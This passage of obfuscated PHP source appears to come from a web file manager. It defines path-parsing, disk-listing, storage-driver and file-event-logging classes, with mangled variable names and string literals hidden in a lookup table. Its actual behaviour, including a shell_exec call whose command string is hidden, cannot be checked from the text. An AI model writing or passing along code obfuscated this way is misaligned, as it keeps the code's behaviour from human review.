file_put_contents($•Œ×ì . $¿Ç®Á€„[1263], $¿Ç®Á€„[12]); file_put_contents(DATA_PATH . $¿Ç®Á€„[1263], $¿Ç®Á€„[12]); Model($¿Ç®Á€„[1330])->set($¿Ç®Á€„[1331], $•Œ×ì); return $•Œ×ì; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\x52\145\x63\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\x69\154\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\162\x46\x69\154\145\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\x70\x52\x6f\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\x53\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\162\x53\150\x61\162\x65\x4c\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\x65\124\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\145\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\x65\111\x74\145\x6d\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\153\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\x65\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\162\x7d"; public static function typeList() { $›şîŒ¸¹ =& $_SERVER[³Ôà×Ó]; return array($›şîŒ¸¹[1333] => self::KOD_SOURCE, $›şîŒ¸¹[1334] => self::KOD_USER_RECYCLE, $›şîŒ¸¹[1335] => self::KOD_USER_FAV, $›şîŒ¸¹[1336] => self::KOD_USER_FILE_TAG, $›şîŒ¸¹[1337] => self::KOD_USER_FILE_TYPE, $›şîŒ¸¹[1338] => self::KOD_GROUP_ROOT_SELF, $›şîŒ¸¹[1339] => self::KOD_USER_SHARE, $›şîŒ¸¹[1340] => self::KOD_USER_SHARE_LINK, $›şîŒ¸¹[1341] => self::KOD_USER_SHARE_TO_ME, $›şîŒ¸¹[1342] => self::KOD_SHARE_ITEM, $›şîŒ¸¹[1343] => self::KOD_SHARE_LINK, $›şîŒ¸¹[1344] => self::KOD_SEARCH, $›şîŒ¸¹[1345] => self::KOD_BLOCK, $›şîŒ¸¹[1346] => self::KOD_IO, $›şîŒ¸¹[1347] => self::KOD_USER_RECENT, $›şîŒ¸¹[1348] => self::KOD_USER_DRIVER); } public static function parse($¡š½£Ğç) { $§ùòÙºæ =& $_SERVER[³Ôà×Ó]; $¡š½£Ğç = self::clear($¡š½£Ğç); $Æ¦¾Öı¡ = array_values(self::typeList()); preg_match($§ùòÙºæ[1349], $¡š½£Ğç, $·õˆÛ…); $é¤îÆ‡  = array($§ùòÙºæ[505] => !1, $§ùòÙºæ[1350] => !1, $§ùòÙºæ[502] => !1, $§ùòÙºæ[87] => $¡š½£Ğç, $§ùòÙºæ[1248] => !1, $§ùòÙºæ[1247] => $§ùòÙºæ[12]); if (is_array($·õˆÛ…) && count($·õˆÛ…) == 5) { $¯Å£Ä‡ = $§ùòÙºæ[1351] . $·õˆÛ…[2] . $§ùòÙºæ[403]; if (in_array($¯Å£Ä‡, $Æ¦¾Öı¡)) { $é¤îÆ‡ [$§ùòÙºæ[1248]] = $·õˆÛ…[1]; $é¤îÆ‡ [$§ùòÙºæ[33]] = $¯Å£Ä‡; $é¤îÆ‡ [$§ùòÙºæ[1352]] = substr($¯Å£Ä‡, 1, -1); $é¤îÆ‡ [$§ùòÙºæ[484]] = $·õˆÛ…[3]; } $é¤îÆ‡ [$§ùòÙºæ[1247]] = $·õˆÛ…[4]; } $Ñ•×ì•‹ = array($§ùòÙºæ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $é¤îÆ‡ [$§ùòÙºæ[1315]] = in_array($é¤îÆ‡ [$§ùòÙºæ[33]], $Ñ•×ì•‹); return $é¤îÆ‡ ; } public static function isTruePath($åÈÑ”Ïø) { $›Ñ²şâÁ =& $_SERVER[³Ôà×Ó]; if (substr($åÈÑ”Ïø, 0, 1) != $›Ñ²şâÁ[1351]) { return !0; } if (strpos($åÈÑ”Ïø, $›Ñ²şâÁ[492]) === 0) { return !0; } if (strpos($åÈÑ”Ïø, $›Ñ²şâÁ[1319]) === 0) { return !0; } if (strpos($åÈÑ”Ïø, $›Ñ²şâÁ[1353]) === 0) { return !0; } if (strpos($åÈÑ”Ïø, $›Ñ²şâÁ[1354]) === 0) { return !0; } if (strpos($åÈÑ”Ïø, $›Ñ²şâÁ[1355]) === 0) { return !0; } return !1; } public static function clear($§á÷æ€ô) { $œ´ã²Ê¢ =& $_SERVER[³Ôà×Ó]; $§á÷æ€ô = str_replace(array($œ´ã²Ê¢[1154], $œ´ã²Ê¢[262]), $œ´ã²Ê¢[53], $§á÷æ€ô); $§á÷æ€ô = str_replace($œ´ã²Ê¢[100], $œ´ã²Ê¢[8], $§á÷æ€ô); $Â¡ø‰–µ = $œ´ã²Ê¢[1356]; if (substr($§á÷æ€ô, 0, 3) == $œ´ã²Ê¢[1357]) { $§á÷æ€ô = substr($§á÷æ€ô, 3); } while (strstr($§á÷æ€ô, $Â¡ø‰–µ)) { $§á÷æ€ô = str_replace($Â¡ø‰–µ, $œ´ã²Ê¢[8], $§á÷æ€ô); } $§á÷æ€ô = preg_replace($œ´ã²Ê¢[1358], $œ´ã²Ê¢[8], $§á÷æ€ô); if ($§á÷æ€ô == $œ´ã²Ê¢[8]) { return $œ´ã²Ê¢[8]; } $§á÷æ€ô = rtrim($§á÷æ€ô, $œ´ã²Ê¢[8]); return $§á÷æ€ô; } public static function pathTrue($ğÚÇŸä) { $²Æäùó© =& $_SERVER[³Ôà×Ó]; if (!$ğÚÇŸä) { return $²Æäùó©[12]; } $ğÚÇŸä = str_replace($²Æäùó©[601], $²Æäùó©[8], str_replace($²Æäùó©[1359], $²Æäùó©[8], $ğÚÇŸä)); $ğÚÇŸä = str_replace($²Æäùó©[601], $²Æäùó©[8], str_replace($²Æäùó©[1359], $²Æäùó©[8], $ğÚÇŸä)); if (!strstr($ğÚÇŸä, $²Æäùó©[1357])) { return $ğÚÇŸä; } $¸¬Ù£¹Ø = explode($²Æäùó©[8], $ğÚÇŸä); foreach ($¸¬Ù£¹Ø as $³æúôİ× => $±½‚Û©) { if ($±½‚Û© !== $²Æäùó©[1360]) { continue; } for ($¾¨É¨Ôë = $³æúôİ×; $¾¨É¨Ôë >= 0; $¾¨É¨Ôë--) { if ($¸¬Ù£¹Ø[$¾¨É¨Ôë] === $²Æäùó©[10] || $¸¬Ù£¹Ø[$¾¨É¨Ôë] === $²Æäùó©[1360] || $¸¬Ù£¹Ø[$¾¨É¨Ôë] === -1) { continue; } if ($¸¬Ù£¹Ø[$¾¨É¨Ôë] === $²Æäùó©[12]) { $¸¬Ù£¹Ø[$³æúôİ×] = -1; break; } $¸¬Ù£¹Ø[$³æúôİ×] = -1; $¸¬Ù£¹Ø[$¾¨É¨Ôë] = -1; break; } } $åĞ§İÃ = array(); foreach ($¸¬Ù£¹Ø as $±½‚Û©) { if ($±½‚Û© !== -1) { $åĞ§İÃ[] = $±½‚Û©; } } $¥©´¯‰Ò = implode($²Æäùó©[8], $åĞ§İÃ); if (strpos($¥©´¯‰Ò, $²Æäùó©[1361]) === 0) { $¥©´¯‰Ò = $²Æäùó©[1357] . substr($¥©´¯‰Ò, strlen($²Æäùó©[1361])); } return $¥©´¯‰Ò; } public static function pathUrlClear($Ë“©…äŠ) { $÷ú”êù =& $_SERVER[³Ôà×Ó]; if (!$Ë“©…äŠ) { return $Ë“©…äŠ; } $Ë“©…äŠ = rawurldecode($Ë“©…äŠ); $Ë“©…äŠ = str_replace($÷ú”êù[1359], $÷ú”êù[8], $Ë“©…äŠ); if (strpos($Ë“©…äŠ, $÷ú”êù[76]) > 0) { $Ë“©…äŠ = substr($Ë“©…äŠ, 0, strpos($Ë“©…äŠ, $÷ú”êù[76])); } if (strpos($Ë“©…äŠ, $÷ú”êù[1362]) > 0) { $Ë“©…äŠ = substr($Ë“©…äŠ, 0, strpos($Ë“©…äŠ, $÷ú”êù[1362])); } return $Ë“©…äŠ; } public static function sourceID($õâŸÕ¯) { $¶¥€íäı =& $_SERVER[³Ôà×Ó]; $İàîâÂ¼ = self::parse($õâŸÕ¯); if ($İàîâÂ¼[$¶¥€íäı[33]] !== self::KOD_SOURCE) { show_json(LNG($¶¥€íäı[1363]), !1); } return $İàîâÂ¼[$¶¥€íäı[484]]; } public static function make($¯ŒÁ¯¤›) { if (!$¯ŒÁ¯¤›) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¯ŒÁ¯¤›)); } public static function makeShare($ü²œ¿©¸, $ÇÁÓÌ·¤) { return self::makePath(self::KOD_SHARE_ITEM, $ü²œ¿©¸, $ÇÁÓÌ·¤); } public static function makeFileTypePath($¹¹ÜğÉû) { return self::makePath(self::KOD_USER_FILE_TYPE, $¹¹ÜğÉû); } public static function makeFileTagPath($¨İ’Éãö) { return self::makePath(self::KOD_USER_FILE_TAG, $¨İ’Éãö); } public static function makePath($–‚ö·¤, $·‡”Åæù = '', $®ÊÇ–ŠÊ = '') { $¤ê„ÇáÚ =& $_SERVER[³Ôà×Ó]; $×‰Ü¾°— = substr($–‚ö·¤, 1, -1); $”±Œ¿ù” = $¤ê„ÇáÚ[1364] . $×‰Ü¾°— . $¤ê„ÇáÚ[1365] . $·‡”Åæù . $¤ê„ÇáÚ[1366]; $”±Œ¿ù” = $®ÊÇ–ŠÊ ? $”±Œ¿ù” . $®ÊÇ–ŠÊ . $¤ê„ÇáÚ[8] : $”±Œ¿ù”; return $”±Œ¿ù”; } public static function hashPath($Æá§Üù, $¤­÷‡ = true) { $éˆ½¨ùØ =& $_SERVER[³Ôà×Ó]; $•ÚÅ¯· = is_array($Æá§Üù) ? $Æá§Üù : IO::info($Æá§Üù); $¹šÉ¿Öò = _get($•ÚÅ¯·, $éˆ½¨ùØ[1367], $éˆ½¨ùØ[12]); if (!$¹šÉ¿Öò && isset($•ÚÅ¯·[$éˆ½¨ùØ[235]])) { $¹šÉ¿Öò = trim($•ÚÅ¯·[$éˆ½¨ùØ[235]], $éˆ½¨ùØ[121]); } if (!$¹šÉ¿Öò && isset($•ÚÅ¯·[$éˆ½¨ùØ[193]]) && $•ÚÅ¯·[$éˆ½¨ùØ[193]]) { $•ÚÅ¯· = IO::info(KodIO::make($•ÚÅ¯·[$éˆ½¨ùØ[193]])); $¹šÉ¿Öò = _get($•ÚÅ¯·, $éˆ½¨ùØ[1367], $éˆ½¨ùØ[12]); } $ÛÉ‘äåú = md5($•ÚÅ¯·[$éˆ½¨ùØ[87]] . $•ÚÅ¯·[$éˆ½¨ùØ[79]] . $•ÚÅ¯·[$éˆ½¨ùØ[88]]); if (!$¹šÉ¿Öò && file_exists($•ÚÅ¯·[$éˆ½¨ùØ[87]])) { $¹šÉ¿Öò = Cache::get($ÛÉ‘äåú . $éˆ½¨ùØ[1368]); $¹šÉ¿Öò = !1; if (!$¹šÉ¿Öò) { $¹šÉ¿Öò = IO::hashSimple($•ÚÅ¯·[$éˆ½¨ùØ[87]]); Cache::set($ÛÉ‘äåú . $éˆ½¨ùØ[1368], $¹šÉ¿Öò, 3600 * 24 * 30); } } if ($¤­÷‡ && !$¹šÉ¿Öò) { } return $¹šÉ¿Öò ? $¹šÉ¿Öò : $ÛÉ‘äåú; } public static function hashPathSafe($‹çİÍê , $©·Çê¦ = true) { $Í’¤üú¤ =& $_SERVER[³Ôà×Ó]; $œòÜúÌ’ = self::hashPath($‹çİÍê , $©·Çê¦); return md5($œòÜúÌ’ . $Í’¤üú¤[1369] . Model($Í’¤üú¤[845])->get($Í’¤üú¤[846])); } public static function initSystemPath() { $ÀÔÃÄØ‡ =& $_SERVER[³Ôà×Ó]; if (defined($ÀÔÃÄØ‡[1370])) { return; } define($ÀÔÃÄØ‡[1370], self::systemPath($ÀÔÃÄØ‡[191])); define($ÀÔÃÄØ‡[1371], self::systemPath($ÀÔÃÄØ‡[1372])); define($ÀÔÃÄØ‡[1373], self::systemPath($ÀÔÃÄØ‡[1374])); define($ÀÔÃÄØ‡[1375], self::systemPath($ÀÔÃÄØ‡[1376])); IOHistory::bindEvent(); } public static function systemPath($å®÷ğßŒ) { $ªÌëâÀ =& $_SERVER[³Ôà×Ó]; $¼ıÏı„Ã = $ªÌëâÀ[1377] . ucfirst($å®÷ğßŒ); $Ûğ–÷§Æ = Model($ªÌëâÀ[845])->get($¼ıÏı„Ã); if ($Ûğ–÷§Æ) { return $Ûğ–÷§Æ; } if ($å®÷ğßŒ == $ªÌëâÀ[191]) { $Ûğ–÷§Æ = self::make(Model($ªÌëâÀ[899])->systemRootPathAdd($ªÌëâÀ[614])); } else { $Ûğ–÷§Æ = self::systemPath($ªÌëâÀ[191]); $ÕÑÙİœá = self::sourceID($Ûğ–÷§Æ); $Ûğ–÷§Æ = self::make(Model($ªÌëâÀ[899])->mkdir($ÕÑÙİœá, $å®÷ğßŒ)); } Model($ªÌëâÀ[845])->set($¼ıÏı„Ã, $Ûğ–÷§Æ); return $Ûğ–÷§Æ; } public static function systemFolder($‚ÈÁ§Ÿ©) { $¿ŠÕàŸ¿ = IO_PATH_SYSTEM_SOURCE . $‚ÈÁ§Ÿ©; $±Ööà„œ = Cache::get($¿ŠÕàŸ¿); if (!$±Ööà„œ) { $œÃßöí = IO::infoFullSimple($¿ŠÕàŸ¿); if (!$œÃßöí) { $±Ööà„œ = IO::mkdir($¿ŠÕàŸ¿, REPEAT_SKIP); } else { $±Ööà„œ = $œÃßöí[$_SERVER[³Ôà×Ó][87]]; } Cache::set($¿ŠÕàŸ¿, $±Ööà„œ, 3600 * 10); } return $±Ööà„œ; } public static function defaultDriver() { return Model($_SERVER[³Ôà×Ó][842])->defaultDriver(); } public static function defaultIO() { $·ˆëæ×‚ =& $_SERVER[³Ôà×Ó]; $—‰ÜúŠÒ = self::defaultDriver(); return $·ˆëæ×‚[1378] . $—‰ÜúŠÒ[$·ˆëæ×‚[484]] . $·ˆëæ×‚[1366]; } public static function defaultDriverInit() { static $Ş¹ŒÂ‰… = false; if ($Ş¹ŒÂ‰…) { return $Ş¹ŒÂ‰…; } $Ş¹ŒÂ‰… = IO::init(self::defaultIO()); return $Ş¹ŒÂ‰…; } public static function fileTypeList() { $ˆ‚ø”” =& $_SERVER[³Ôà×Ó]; $ıÌÙ÷›Ó = $GLOBALS[$ˆ‚ø””[6]][$ˆ‚ø””[1379]]; foreach ($ıÌÙ÷›Ó as $É¿ûÙ§Ç => $ƒµûÓØö) { $ëğ±Ç¼† = $ˆ‚ø””[1380] . $É¿ûÙ§Ç; $öĞ’‘Â = LNG($ëğ±Ç¼†); if ($ëğ±Ç¼† != $öĞ’‘Â) { $ıÌÙ÷›Ó[$É¿ûÙ§Ç][$ˆ‚ø””[32]] = $öĞ’‘Â; } } return $ıÌÙ÷›Ó; } public static function diskList($Ş°åß¾ = true) { $†ú—ÉÛ = $_SERVER[³Ôà×Ó][1381]; if ($Ş°åß¾) { $‹é•áêÛ = Cache::get($†ú—ÉÛ); if (is_array($‹é•áêÛ)) { return $‹é•áêÛ; } } $‹é•áêÛ = self::diskListGet(); Cache::set($†ú—ÉÛ, $‹é•áêÛ, 60); return $‹é•áêÛ; } public static function diskListGet() { $šĞœ²´ =& $_SERVER[³Ôà×Ó]; $ˆÙŸ²Å = array(); if ($GLOBALS[$šĞœ²´[6]][$šĞœ²´[1382]] == $šĞœ²´[1383]) { $ÌîÊÁ—ç = $šĞœ²´[1384]; for ($ïÕ¹ü‰· = 0; $ïÕ¹ü‰· < strlen($ÌîÊÁ—ç); $ïÕ¹ü‰·++) { $¶è¤®å = $ÌîÊÁ—ç[$ïÕ¹ü‰·] . $šĞœ²´[1385]; if (file_exists($¶è¤®å)) { $ˆÙŸ²Å[] = $¶è¤®å; } } return $ˆÙŸ²Å; } if (!function_exists($šĞœ²´[101])) { $ˆÙŸ²Å[] = $šĞœ²´[910]; return $ˆÙŸ²Å; } $íçÔê²‹ = explode($šĞœ²´[262], shell_exec($šĞœ²´[1386])); array_shift($íçÔê²‹); array_pop($íçÔê²‹); $âãƒ—· = array($šĞœ²´[1387], $šĞœ²´[1388], $šĞœ²´[1389], $šĞœ²´[1390], $šĞœ²´[1391], $šĞœ²´[1392], $šĞœ²´[1393], $šĞœ²´[1394]); foreach ($íçÔê²‹ as $Ä«‚áªì) { $ŠöÎ„ïŠ = preg_split($šĞœ²´[1395], $Ä«‚áªì); $¶è¤®å = $ŠöÎ„ïŠ[count($ŠöÎ„ïŠ) - 1]; if (!strstr($ŠöÎ„ïŠ[0], $šĞœ²´[1396]) || !$¶è¤®å) { continue; } $çøƒ´¨ç = rtrim($¶è¤®å, $šĞœ²´[8]) . $šĞœ²´[8]; if (in_array($çøƒ´¨ç, $âãƒ—·)) { continue; } $ˆÙŸ²Å[] = $çøƒ´¨ç; } return $ˆÙŸ²Å; } public static function isSameDisk($–ÏÂŠ»ä, $àƒ÷ë) { $¯ÑÃÎÖ‹ =& $_SERVER[³Ôà×Ó]; if ($GLOBALS[$¯ÑÃÎÖ‹[6]][$¯ÑÃÎÖ‹[1382]] == $¯ÑÃÎÖ‹[1383]) { return strtolower(substr($–ÏÂŠ»ä, 0, 1)) == strtolower(substr($àƒ÷ë, 0, 1)); } $ºÚ‰¬²® = self::diskList(); $ªŠ”Ï¢Ø = !1; $À’¾Ñâ© = !1; sort($ºÚ‰¬²®); $ºÚ‰¬²® = array_reverse($ºÚ‰¬²®); $–ÏÂŠ»ä = rtrim($–ÏÂŠ»ä, $¯ÑÃÎÖ‹[8]) . $¯ÑÃÎÖ‹[8]; $àƒ÷ë = rtrim($àƒ÷ë, $¯ÑÃÎÖ‹[8]) . $¯ÑÃÎÖ‹[8]; foreach ($ºÚ‰¬²® as $ÔŒ¡©Ç‡) { $ˆ¸ÌÆ—¼ = strlen($ÔŒ¡©Ç‡); if (!$ªŠ”Ï¢Ø && substr($–ÏÂŠ»ä, 0, $ˆ¸ÌÆ—¼) == $ÔŒ¡©Ç‡) { $ªŠ”Ï¢Ø = $ÔŒ¡©Ç‡; } if (!$À’¾Ñâ© && substr($àƒ÷ë, 0, $ˆ¸ÌÆ—¼) == $ÔŒ¡©Ç‡) { $À’¾Ñâ© = $ÔŒ¡©Ç‡; } if ($ªŠ”Ï¢Ø && $À’¾Ñâ©) { break; } } return $ªŠ”Ï¢Ø === $À’¾Ñâ©; } public static function transferType($Ë¬«±, $Ñêçû«í) { $èµ÷‘Á« =& $_SERVER[³Ôà×Ó]; $¾”Ò‹Øù = self::driverType($Ë¬«±); $™×İı·Ú = self::driverType($Ñêçû«í); if ($¾”Ò‹Øù[$èµ÷‘Á«[33]] == $™×İı·Ú[$èµ÷‘Á«[33]] && $¾”Ò‹Øù[$èµ÷‘Á«[1397]] == $™×İı·Ú[$èµ÷‘Á«[1397]]) { return $èµ÷‘Á«[1398]; } if ($¾”Ò‹Øù[$èµ÷‘Á«[33]] == $èµ÷‘Á«[943] && $™×İı·Ú[$èµ÷‘Á«[33]] == $èµ÷‘Á«[109]) { return $èµ÷‘Á«[1276]; } if ($¾”Ò‹Øù[$èµ÷‘Á«[33]] == $èµ÷‘Á«[109] && $™×İı·Ú[$èµ÷‘Á«[33]] == $èµ÷‘Á«[943]) { return $èµ÷‘Á«[110]; } return $èµ÷‘Á«[1399]; } public static function driverType($„€’„Å) { $À«ôÛ¯² =& $_SERVER[³Ôà×Ó]; $ŸÎÄ»ñš = str_replace($À«ôÛ¯²[1400], $À«ôÛ¯²[12], strtolower($„€’„Å->getType())); if ($ŸÎÄ»ñš == $À«ôÛ¯²[832] || $ŸÎÄ»ñš == $À«ôÛ¯²[1401] || $ŸÎÄ»ñš == $À«ôÛ¯²[1402]) { $„€’„Å = self::defaultDriverInit(); } else { if ($ŸÎÄ»ñš == $À«ôÛ¯²[1286] || $ŸÎÄ»ñš == $À«ôÛ¯²[1403]) { $„€’„Å = IO::init($„€’„Å->pathParse[$À«ôÛ¯²[1229]]); } } $÷Œ½á¾Á = $„€’„Å->path; $ŸÎÄ»ñš = str_replace($À«ôÛ¯²[1400], $À«ôÛ¯²[12], strtolower($„€’„Å->getType())); if ($ŸÎÄ»ñš == $À«ôÛ¯²[109]) { return array($À«ôÛ¯²[33] => $À«ôÛ¯²[109], $À«ôÛ¯²[1397] => $À«ôÛ¯²[12], $À«ôÛ¯²[87] => $÷Œ½á¾Á, $À«ôÛ¯²[98] => $„€’„Å); } return array($À«ôÛ¯²[33] => $À«ôÛ¯²[943], $À«ôÛ¯²[1397] => $„€’„Å->pathDriver, $À«ôÛ¯²[87] => $÷Œ½á¾Á, $À«ôÛ¯²[98] => $„€’„Å); } public static function pathDriverType($À·×ÓÚÖ) { return $À·×ÓÚÖ ? self::driverType(IO::init($À·×ÓÚÖ)) : !1; } public static function pathDriverLocal($ ¡úû—ï) { $¿™¥ ¾Õ =& $_SERVER[³Ôà×Ó]; $´Æµˆ³Ó = $ ¡úû—ï ? self::driverType(IO::init($ ¡úû—ï)) : !1; return $´Æµˆ³Ó[$¿™¥ ¾Õ[33]] == $¿™¥ ¾Õ[109] ? !0 : !1; } public static function allowCover($Ù„«ëÀ¾, $©šÏ¬Ïï = true) { $Æ¾®Ş÷á =& $_SERVER[³Ôà×Ó]; if (is_string($Ù„«ëÀ¾)) { $Ù„«ëÀ¾ = IO::info($Ù„«ëÀ¾); } if (!$Ù„«ëÀ¾ || $Ù„«ëÀ¾[$Æ¾®Ş÷á[33]] == $Æ¾®Ş÷á[78] || $Ù„«ëÀ¾[$Æ¾®Ş÷á[79]] <= 100) { return !1; } if (isset($Ù„«ëÀ¾[$Æ¾®Ş÷á[1404]]) || !$Ù„«ëÀ¾[$Æ¾®Ş÷á[87]]) { return !1; } if (isset($Ù„«ëÀ¾[$Æ¾®Ş÷á[232]]) && !$Ù„«ëÀ¾[$Æ¾®Ş÷á[232]]) { return !1; } static $›¾¨†ŸĞ = false; if (!$›¾¨†ŸĞ || !$©šÏ¬Ïï) { $„°Ûìì = self::driverType(IO::init($Ù„«ëÀ¾[$Æ¾®Ş÷á[87]])); $ÚÍÎîÆ = $„°Ûìì[$Æ¾®Ş÷á[98]]; $›¾¨†ŸĞ = $Æ¾®Ş÷á[196]; if ($„°Ûìì[$Æ¾®Ş÷á[33]] == $Æ¾®Ş÷á[109]) { $›¾¨†ŸĞ = $Æ¾®Ş÷á[1405]; } if ($„°Ûìì[$Æ¾®Ş÷á[98]] && is_array($„°Ûìì[$Æ¾®Ş÷á[98]]->config)) { $íò¹»£ú = $„°Ûìì[$Æ¾®Ş÷á[98]]->config; if (isset($íò¹»£ú[$Æ¾®Ş÷á[1406]]) && $íò¹»£ú[$Æ¾®Ş÷á[1406]]) { $›¾¨†ŸĞ = $Æ¾®Ş÷á[1405]; } } } return $›¾¨†ŸĞ == $Æ¾®Ş÷á[1405] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($‰ØÁÑ°) { parent::__construct($‰ØÁÑ°); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($àùîÏæ„) { $¬ÖÄ„« =& $_SERVER[³Ôà×Ó]; if (substr($àùîÏæ„, 0, 7) == $¬ÖÄ„«[313]) { $àùîÏæ„ = $¬ÖÄ„«[314] . substr($àùîÏæ„, 7); } header($¬ÖÄ„«[175] . $àùîÏæ„); die; } } goto AàœŸÒİ¨¼; FƒœŸ“Š™ğ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\143\145\x5f\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\162\145\141\x74\145\124\x69\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\145\162\164", "\146\x75\156\x63\164\x69\157\156"), array("\x64\145\163\143", '', "\x69\x6e\163\x65\162\164\54\x75\160\144\x61\x74\145\54\x73\x65\154\145\x63\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ùùİ¢ª¢, $öÄâ¦ïœ, $Ç²î¶‰¯ = '') { $¸½ ú =& $_SERVER[³Ôà×Ó]; if (!$this->eventSave) { return; } $–Ê•ÍÀ• = Model($¸½ ú[1414])->sourceInfo($ùùİ¢ª¢); if (!$–Ê•ÍÀ•) { return !1; } if ($this->isDisableEvent($–Ê•ÍÀ•, $öÄâ¦ïœ)) { return; } if ($Ç²î¶‰¯ && is_string($Ç²î¶‰¯)) { $Ç²î¶‰¯ = array($¸½ ú[2002] => $Ç²î¶‰¯); } $Çˆ“¨¯¯ = defined($¸½ ú[2189]) ? USER_ID : 0; $¸†×» = array($¸½ ú[500] => $ùùİ¢ª¢, $¸½ ú[2190] => $–Ê•ÍÀ•[$¸½ ú[192]], $¸½ ú[2191] => $–Ê•ÍÀ•[$¸½ ú[32]], $¸½ ú[591] => !empty($–Ê•ÍÀ•[$¸½ ú[591]]) ? $–Ê•ÍÀ•[$¸½ ú[591]] : $¸½ ú[12], $¸½ ú[1756] => $Çˆ“¨¯¯, $¸½ ú[505] => $öÄâ¦ïœ, $¸½ ú[1758] => $Ç²î¶‰¯); $this->addSystemLog($öÄâ¦ïœ, $¸†×»); unset($¸†×»[$¸½ ú[2191]], $¸†×»[$¸½ ú[591]]); return $this->add($¸†×»); } private function addSystemLog($ŸÇ£Õ¿ı, $ïùÄÙú†) { $êƒ“œÜ‡ =& $_SERVER[³Ôà×Ó]; if ($ŸÇ£Õ¿ı == $êƒ“œÜ‡[2192]) { $ŸÇ£Õ¿ı = $ïùÄÙú†[$êƒ“œÜ‡[535]][$êƒ“œÜ‡[2193]]; } else { if (in_array($ŸÇ£Õ¿ı, array($êƒ“œÜ‡[1943], $êƒ“œÜ‡[2194]))) { $ŸÇ£Õ¿ı = $ïùÄÙú†[$êƒ“œÜ‡[535]][$êƒ“œÜ‡[171]]; } } $¬˜š¤­Å = array_merge($ïùÄÙú†, array($êƒ“œÜ‡[2195] => $ïùÄÙú†[$êƒ“œÜ‡[193]], $êƒ“œÜ‡[2196] => $ïùÄÙú†[$êƒ“œÜ‡[2196]])); Hook::trigger($êƒ“œÜ‡[2197], $êƒ“œÜ‡[2198] . $ŸÇ£Õ¿ı, $ïùÄÙú†); Model($êƒ“œÜ‡[1907])->addLog($êƒ“œÜ‡[2198] . $ŸÇ£Õ¿ı, $¬˜š¤­Å); } private function isDisableEvent($•ÅÜ›å¾, $‹¶í‹ÂÃ) { $Ú³µŒ =& $_SERVER[³Ôà×Ó]; if ($•ÅÜ›å¾[$Ú³µŒ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‹¶í‹ÂÃ == $Ú³µŒ[1932]) { return !1; } return !0; } public function eventCreate($¿¿È§ä², $ëÂóåÑØ) { $›ûë’É =& $_SERVER[³Ôà×Ó]; $¼şÅ’Ô‡ = Model($›ûë’É[1414])->sourceInfo($¿¿È§ä²); $•Õã¿¹ƒ = array($›ûë’É[2193] => $ëÂóåÑØ, $›ûë’É[32] => $¼şÅ’Ô‡[$›ûë’É[32]]); return $this->addEvent($¿¿È§ä², $›ûë’É[2192], $•Õã¿¹ƒ); } public function eventFileEdit($ˆôƒäñ¿) { $Í»Ü‡Äû =& $_SERVER[³Ôà×Ó]; $ŒÇãÄ¨¹ = array($Í»Ü‡Äû[2199] => $_SERVER[$Í»Ü‡Äû[2200]], $Í»Ü‡Äû[2201] => strtolower(ACTION)); if (isset($GLOBALS[$Í»Ü‡Äû[7]][$Í»Ü‡Äû[2202]])) { $ŒÇãÄ¨¹[$Í»Ü‡Äû[2202]] = $Í»Ü‡Äû[91]; } return $this->addEvent($ˆôƒäñ¿, $Í»Ü‡Äû[1933], $ŒÇãÄ¨¹); } public function eventRecycle($€¾İıÕı, $â¨ªŠ±Æ) { return $this->addEvent($€¾İıÕı, $_SERVER[³Ôà×Ó][2194], $â¨ªŠ±Æ); } private static $_removeLast = ''; public function eventRemove($Ø³ÄÓÛï) { $ÎÆ˜ØÔ² =& $_SERVER[³Ôà×Ó]; self::$_removeLast = $Ø³ÄÓÛï; $ïõ·†Ì¶ = Model($ÎÆ˜ØÔ²[1414])->sourceInfo($Ø³ÄÓÛï); $÷ÛóŸºÊ = array_field_key($ïõ·†Ì¶, array($ÎÆ˜ØÔ²[193], $ÎÆ˜ØÔ²[550], $ÎÆ˜ØÔ²[514], $ÎÆ˜ØÔ²[593])); $ö¡À›ü = array($ÎÆ˜ØÔ²[171] => $ïõ·†Ì¶[$ÎÆ˜ØÔ²[32]], $ÎÆ˜ØÔ²[2201] => ACTION, $ÎÆ˜ØÔ²[2203] => $÷ÛóŸºÊ); return $this->addEvent($ïõ·†Ì¶[$ÎÆ˜ØÔ²[192]], $ÎÆ˜ØÔ²[1932], $ö¡À›ü); } public function eventShare($°ÚÅñì×, $Ÿ¢ëŸûş) { return $this->addEvent($°ÚÅñì×, $_SERVER[³Ôà×Ó][1943], $Ÿ¢ëŸûş); } public function eventMove($ÇÆãº¿÷, $ÉäåÁš®, $÷Ëø¥ÃŠ) { $’öÑ•èŞ =& $_SERVER[³Ôà×Ó]; if 